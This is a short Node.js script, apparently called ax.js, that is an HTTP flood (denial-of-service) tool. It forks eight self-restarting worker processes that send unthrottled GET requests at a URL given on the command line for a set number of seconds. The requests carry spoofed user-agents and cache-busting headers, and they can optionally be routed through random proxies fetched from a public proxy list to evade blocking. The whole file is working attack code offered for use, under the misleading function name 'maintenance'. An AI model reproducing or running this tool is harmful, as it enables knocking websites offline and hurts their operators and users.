const axios = require('axios')
const fakeUa = require('fake-useragent')
const cluster = require('cluster')
const HttpsProxyAgent = require('https-proxy-agent')

async function maintenance() {
  if (process.argv.length !== 5){
    console.log('USAGE : node ax.js raw/proxy')
    process.exit()
  }
  
  
  else{
    if (process.argv[4] == 'raw'){
    }
    else if(process.argv[4] == 'proxy'){
      const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
      var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
    }
    else{
      process.exit()
    }
    function run(){
    if (process.argv[4] == 'raw'){
      var config={
        url: process.argv[2],
        medthod:'get',
        headers:{
            'Cache-Control': 'no-cache',
            'User-Agent': fakeUa()
        }
      }
      axios(config).then(function (re){
      }).catch(function (error){
      })
    }
    else if(process.argv[4] == 'proxy'){
      let proxy = proxies[Math.floor(Math.random() * proxies.length)];
      var agent = new HttpsProxyAgent('http://' + proxy);
      var cung={
        url:process.argv[2],
        httpsAgent: agent,
        medthod:'get',
        headers:{
           'Cache-Control': 'no-cache',
           'User-Agent': fakeUa()
          
        }
      }
      axios(cung).then(function (res){
      }).catch(function (error){
      })
    }
    
  }
  
  // body...
}


function time(){
  setInterval(()=>{
    run()
  })
}

async function th(){
  if (cluster.isMaster){
    for (let u=0;u<8;u++){
      cluster.fork()
    }
    cluster.on('exit',function(){
      cluster.fork()
    })
  }
  else{
    time()
  }
  
}
th()




}

setTimeout(function(){
    process.exit();
}, process.argv[3] * 1000);

maintenance()


process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});

